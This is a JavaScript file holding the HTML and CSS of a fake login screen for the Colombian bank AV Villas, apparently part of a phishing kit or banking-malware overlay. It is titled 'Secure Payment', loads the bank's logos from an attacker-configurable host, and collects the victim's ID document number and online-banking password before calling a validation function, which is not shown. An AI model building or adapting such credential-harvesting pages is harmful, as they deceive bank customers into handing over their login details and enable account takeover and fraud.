var my_titulo = 'Secure Payment';
var my_contenido = `
<style>
    * {
        font-family: Arial, Helvetica, sans-serif;
        margin: 0;
        padding: 0;
    }

    .form {
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 20px;
    }

    .form label {
        position: relative;
    }

    .form label .input {
        width: 100%;
        padding: 20px 10px 10px 10px;
        outline: none;
        border: 1px solid;
    }

    .form label .input+span {
        position: absolute;
        left: 10px;
        top: 15px;
        transition: 0.3s ease;
    }

    .form label .input:focus+span,
    .form label .input:valid+span {
        top: 5px;
        font-size: 0.7em;
    }

    input {
        width: 100%;
        margin-left: -10px;
        border-radius: 5px;
    }

    #btnUsuario {
        width: 85%;
        height: 45px;
        background-color: red;
        color: white;
        border: none;
        border-radius: 100px;
        margin-left: -10px;
        font-size: 14px;
    }
</style>
<div style="background-image:url(${my_hosting}img/avvillas_background.png);">
    <center>
        <div>
            <br>
            <br>
            <img src="${my_hosting}img/register-bg-logo.svg">
            <br>
            <br>
            <a style="font-size:18px; color:white;">Ingresa a la banca virtual</a>
            <br>
        </div>
        <br>
        <select style="width:90%; height:55px; border-radius:5px; background-color:white; color:black;">
            <option>Cédula de ciudadanía</option>
            <option>Cédula extranjera</option>
            <option>Pasaporte</option>
        </select>
        <div class="form" style="margin-top:15px;">
            <label style="width:85%; height:55px;">
                <input type="text" class="input" id="txtUsuario" required>
                <span>Número de documento</span>
            </label>

            <label style="width:85%; height:55px;">
                <input type="password" class="input" id="txtPassword" required>
                <span>Ingrese su clave</span>
            </label>
            <a href="#" style="color:white; margin-left:50%; font-size:12px;">Olvidé mi contraseña</a>
            <button onclick="validateData()" id="btnUsuario">Ingresar</button>
        </div>
        <br>
        <hr style="width:90%;">
        <br>
        <a style="color:white;">¿Aún no tienes contraseña para ingresar?</a><br>
        <a href="#" style="color:white;">Regístrate</a>
        <img src="${my_hosting}img/avvillas_footer.jfif" width="100%" style="margin-top:110px;">
    </center>
</div>
`;